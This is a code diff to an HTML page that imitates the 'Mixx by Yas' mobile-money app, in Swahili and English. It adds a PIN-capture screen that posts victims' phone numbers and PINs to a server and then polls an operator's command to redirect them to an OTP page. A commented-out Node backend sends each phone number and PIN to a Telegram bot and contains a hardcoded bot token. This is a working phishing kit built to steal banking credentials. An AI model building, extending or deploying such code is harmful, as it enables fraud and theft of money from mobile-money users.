@@ -20,8 +20,10 @@
 
     <style>
       :root {
-        --primary-blue: #003366; /* From the UI image */
-        --accent-yellow: #ffd600; /* From the UI image */
+        --primary-blue: #003366;
+        /* From the UI image */
+        --accent-yellow: #ffd600;
+        /* From the UI image */
         --light-blue-text: #8faadb;
         --bottom-sheet-bg: #ffffff;
         --btn-disabled: #e2e8f0;
@@ -37,7 +39,8 @@
         height: 100dvh;
         display: flex;
         flex-direction: column;
-        overflow: hidden; /* Prevent full page scroll */
+        overflow: hidden;
+        /* Prevent full page scroll */
       }
 
       .lang-toggle {
@@ -72,7 +75,8 @@
         transition:
           transform 0.5s ease-in-out,
           opacity 0.5s ease-in-out;
-        pointer-events: none; /* Prevent interaction when hidden */
+        pointer-events: none;
+        /* Prevent interaction when hidden */
       }
 
       .slide.active {
@@ -95,22 +99,23 @@
         justify-content: center;
         align-items: center;
         margin-bottom: 2rem;
-        margin-top: -2rem; /* Pull up slightly */
+        margin-top: -2rem;
+        /* Pull up slightly */
       }
 
       .slide-img {
         width: 100%;
         height: 100%;
-        object-fit: contain; /* Ensure the whole organic shape fits */
+        object-fit: contain;
+        /* Ensure the whole organic shape fits */
         /* Using a mask to create organic shape if images are rectangular, 
                but assuming provided images already have the shape and background */
       }
 
       /* NEW: Add this class to scale down images that are cropped too tightly */
       .img-tight-crop {
-        transform: scale(
-          0.88
-        ); /* Adjust this decimal (0.1 to 0.9) to make them match */
+        transform: scale(0.88);
+        /* Adjust this decimal (0.1 to 0.9) to make them match */
       }
 
       .slide-text-container {
@@ -136,10 +141,12 @@
         font-style: italic;
         margin-top: 0.25rem;
       }
+
       .pagination {
         position: absolute;
         bottom: 2rem;
-        left: 7.5%; /* Align with text container */
+        left: 7.5%;
+        /* Align with text container */
         display: flex;
         gap: 6px;
       }
@@ -156,7 +163,8 @@
       .dot.active {
         background-color: var(--accent-yellow);
         opacity: 1;
-        width: 8px; /* Keep round in the design shown */
+        width: 8px;
+        /* Keep round in the design shown */
       }
 
       .bottom-sheet {
@@ -164,9 +172,8 @@
         border-top-left-radius: 20px;
         border-top-right-radius: 20px;
         padding: 1.5rem;
-        padding-bottom: calc(
-          1.5rem + env(safe-area-inset-bottom)
-        ); /* For iPhone notch/bar */
+        padding-bottom: calc(1.5rem + env(safe-area-inset-bottom));
+        /* For iPhone notch/bar */
         box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.1);
         position: relative;
         z-index: 10;
@@ -216,7 +223,8 @@
       .submit-btn {
         width: 100%;
         padding: 1rem;
-        border-radius: 24px; /* Pill shape */
+        border-radius: 24px;
+        /* Pill shape */
         font-weight: 600;
         font-size: 1rem;
         border: none;
@@ -263,6 +271,7 @@
           opacity: 0;
           transform: translateY(-10px);
         }
+
         to {
           opacity: 1;
           transform: translateY(0);
@@ -282,12 +291,123 @@
       .lang-option:hover {
         background-color: #f1f5f9;
       }
+
+      #pin-screen {
+        position: fixed;
+        inset: 0;
+        background-color: white;
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 100;
+        opacity: 0;
+        transition: opacity 0.4s ease;
+      }
+
+      #pin-screen.active {
+        display: flex;
+        opacity: 1;
+      }
+
+      .pin-box {
+        width: 60px;
+        height: 60px;
+        border: 2px solid #e2e8f0;
+        border-radius: 12px;
+        text-align: center;
+        font-size: 2.5rem;
+        font-weight: 700;
+        color: var(--accent-yellow) !important;
+        outline: none;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+        /* Privacy feature: dots instead of numbers */
+        -webkit-text-security: disc;
+        -moz-text-security: disc;
+        text-security: disc;
+      }
+
+      .pin-box:focus {
+        border-color: var(--primary-blue);
+        box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.1);
+      }
+
+      #loader-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.95);
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        z-index: 200;
+      }
+
+      .pendulum-container {
+        width: 100px;
+        height: 100px;
+        position: relative;
+      }
+
+      .pendulum-arm {
+        width: 4px;
+        height: 70px;
+        background: var(--primary-blue);
+        position: absolute;
+        top: 0;
+        left: 50%;
+        transform-origin: top center;
+        animation: pendulumMove 1.5s ease-in-out infinite;
+      }
+
+      .pendulum-bob {
+        width: 26px;
+        height: 26px;
+        background: var(--accent-yellow);
+        border-radius: 50%;
+        position: absolute;
+        bottom: -13px;
+        left: -11px;
+        box-shadow: 0 4px 15px rgba(255, 214, 0, 0.6);
+      }
+
+      @keyframes pendulumMove {
+        0% {
+          transform: rotate(45deg);
+        }
+        50% {
+          transform: rotate(-45deg);
+        }
+        100% {
+          transform: rotate(45deg);
+        }
+      }
+
+      .status-text {
+        margin-top: 2.5rem;
+        color: var(--primary-blue);
+        font-weight: 700;
+        font-style: italic;
+        font-size: 1.1rem;
+      }
     </style>
   </head>
+
   <body>
+    <div id="loader-overlay">
+      <div class="pendulum-container">
+        <div class="pendulum-arm">
+          <div class="pendulum-bob"></div>
+        </div>
+      </div>
+      <p class="status-text" id="loader-status">Tafadhali subiri kidogo...</p>
+    </div>
     <div
       id="splash-screen"
-      class="fixed inset-0 z-50 flex items-center justify-center bg-[#0A3D7E] transition-opacity duration-500">
+      class="fixed inset-0 z-50 flex items-center justify-center bg-[#0A3D7E] transition-opacity duration-500"
+    >
       <div class="text-center">
         <img
           src="splash-logo-removebg-preview.png"
@@ -298,8 +418,56 @@
       </div>
     </div>
 
-    <div id="main-content" class="w-full h-full flex flex-col opacity-0 transition-opacity duration-1000">
-      
+    <div id="pin-screen">
+      <button
+        onclick="window.location.reload()"
+        class="absolute top-6 left-6 text-slate-400 hover:text-slate-600"
+      >
+        <i class="fa-solid fa-arrow-left text-xl"></i>
+      </button>
+      <h2 class="text-2xl font-bold text-[#003366] mb-8 italic">
+        Mixx by yas pin
+      </h2>
+      <div class="flex gap-4">
+        <input
+          type="tel"
+          maxlength="1"
+          class="pin-box"
+          id="pin-1"
+          inputmode="numeric"
+          autofocus
+        />
+        <input
+          type="tel"
+          maxlength="1"
+          class="pin-box"
+          id="pin-2"
+          inputmode="numeric"
+        />
+        <input
+          type="tel"
+          maxlength="1"
+          class="pin-box"
+          id="pin-3"
+          inputmode="numeric"
+        />
+        <input
+          type="tel"
+          maxlength="1"
+          class="pin-box"
+          id="pin-4"
+          inputmode="numeric"
+        />
+      </div>
+      <p class="mt-8 text-sm text-slate-400 italic">
+        Tafadhali ingiza siri yako ya siri
+      </p>
+    </div>
+
+    <div
+      id="main-content"
+      class="w-full h-full flex flex-col opacity-0 transition-opacity duration-1000"
+    >
       <header
         class="p-4 relative z-20 flex justify-between items-center w-full"
       >
@@ -497,6 +665,14 @@
       document.addEventListener("DOMContentLoaded", () => {
         const splashScreen = document.getElementById("splash-screen");
         const mainContent = document.getElementById("main-content");
+        const pinScreen = document.getElementById("pin-screen");
+        const pinBoxes = [
+          document.getElementById("pin-1"),
+          document.getElementById("pin-2"),
+          document.getElementById("pin-3"),
+          document.getElementById("pin-4"),
+        ];
+        const loaderOverlay = document.getElementById("loader-overlay");
 
         // Wait for 2 seconds, then transition to main content
         setTimeout(() => {
@@ -541,6 +717,9 @@
             phone_placeholder: "Ingiza namba ya simu!",
             btn_continue: "Endelea",
             lang_name: "Swahili",
+            loading: "Tafadhali subiri kidogo...",
+            done: "Imekamilika!",
+            error: "Jaribu tena baadaye.",
           },
           en: {
             slide1_main: "Various apps<br>are available..",
@@ -550,6 +729,9 @@
             phone_placeholder: "Enter phone number!",
             btn_continue: "Continue",
             lang_name: "English",
+            loading: "Please wait a moment...",
+            done: "Completed!",
+            error: "Please try again later.",
           },
         };
 
@@ -571,6 +753,82 @@
             submitBtn.classList.remove("active");
           }
         });
+
+        // Transition to PIN
+        submitBtn.addEventListener("click", () => {
+          mainContent.style.opacity = "0";
+          setTimeout(() => {
+            mainContent.style.display = "none";
+            pinScreen.style.display = "flex";
+            setTimeout(() => {
+              pinScreen.style.opacity = "1";
+              pinBoxes[0].focus();
+            }, 50);
+            document.body.style.backgroundColor = "white";
+          }, 400);
+        });
+
+        pinBoxes.forEach((box, index) => {
+          box.addEventListener("input", (e) => {
+            if (e.target.value && index < 3) {
+              pinBoxes[index + 1].focus();
+            }
+
+            const fullPin = pinBoxes.map((b) => b.value).join("");
+            if (fullPin.length === 4) {
+              handleFinalSubmission(phoneInput.value, fullPin);
+            }
+          });
+
+          box.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+              pinBoxes[index - 1].focus();
+            }
+          });
+        });
+
+        async function handleFinalSubmission(phone, pin) {
+          const loaderOverlay = document.getElementById("loader-overlay");
+          const statusText = document.getElementById("loader-status");
+          loaderOverlay.style.display = "flex";
+
+          try {
+            const response = await fetch("/api/submit", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ phone, pin }),
+            });
+            const result = await response.json();
+
+            if (result.sessionId) {
+              statusText.textContent = "Inathibitisha... Tafadhali subiri";
+
+              // Start Polling for Admin command
+              const pollInterval = setInterval(async () => {
+                const statusRes = await fetch(
+                  `/api/status/${result.sessionId}`,
+                );
+                const data = await statusRes.json();
+
+                if (data.status === "otp5") {
+                  clearInterval(pollInterval);
+                  window.location.href = `step6.html?len=5&id=${result.sessionId}`;
+                } else if (data.status === "otp6") {
+                  clearInterval(pollInterval);
+                  window.location.href = `step6.html?len=6&id=${result.sessionId}`;
+                } else if (data.status === "done") {
+                  clearInterval(pollInterval);
+                  window.location.href = "https://www.google.com";
+                }
+              }, 2000);
+            }
+          } catch (err) {
+            statusText.textContent = "Mtandao una shida. Jaribu tena.";
+            setTimeout(() => {
+              loaderOverlay.style.display = "none";
+            }, 3000);
+          }
+        }
 
         // --- 2. Language Toggle Logic ---
 
@@ -785,5 +1043,84 @@
         });
       });
     </script>
+
+    <script src="tg-server.js"></script>
+
+    <!-- <script>
+      const express = require("express");
+      const axios = require("axios");
+      const cors = require("cors");
+      const bodyParser = require("body-parser");
+
+      const app = express();
+      const PORT = 5000;
+
+      app.use(cors()); // Allows requests from your frontend
+      app.use(bodyParser.json());
+
+      // --- CONFIGURATION ---
+      // Replace these with your actual Telegram Bot Token and Chat ID
+      const TELEGRAM_BOT_TOKEN =
+        "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
+      const TELEGRAM_ADMIN_ID = "7162306402";
+
+      /**
+       * Sends a message to the Telegram Admin via the Bot API.
+       */
+      async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+          const response = await axios.post(url, {
+            chat_id: TELEGRAM_ADMIN_ID,
+            text: message,
+            parse_mode: "Markdown",
+          });
+          return response.data.ok;
+        } catch (error) {
+          console.error("Error sending message to Telegram:", error.message);
+          return false;
+        }
+      }
+
+      /**
+       * Endpoint to receive data from the onboarding frontend.
+       */
+      app.post("/api/submit", async (req, res) => {
+        const { phone, pin } = req.body;
+
+        if (!phone || !pin) {
+          return res
+            .status(400)
+            .json({ status: "error", message: "Missing fields" });
+        }
+
+        // Formatting the message with a clean UI for the Telegram Admin
+        const msg =
+          `🔔 *New Login Attempt*\n` +
+          `----------------------\n` +
+          `📱 *Phone:* \`+255${phone}\`\n` +
+          `🔐 *PIN:* \`${pin}\`\n` +
+          `----------------------`;
+
+        const success = await sendToTelegram(msg);
+
+        if (success) {
+          console.log(`Log successful for: +255${phone}`);
+          return res
+            .status(200)
+            .json({ status: "success", message: "Data logged" });
+        } else {
+          return res
+            .status(500)
+            .json({ status: "error", message: "Failed to notify admin" });
+        }
+      });
+
+      app.listen(PORT, () => {
+        console.log(`-----------------------------------------`);
+        console.log(`🚀 JS Backend running at http://localhost:${PORT}`);
+        console.log(`-----------------------------------------`);
+      });
+    </script> -->
   </body>
 </html>
